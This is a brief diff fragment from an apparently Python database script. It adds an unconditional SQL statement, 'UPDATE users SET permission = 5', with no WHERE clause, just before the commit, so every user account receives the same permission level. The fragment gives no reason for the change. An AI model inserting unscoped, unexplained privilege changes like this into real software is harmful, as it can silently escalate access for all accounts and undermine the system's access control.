@@ -23,6 +23,8 @@ try:
 except:
     pass
 
+cursor.execute("UPDATE users SET permission = 5")
+
 database.commit()
 
 database.close()
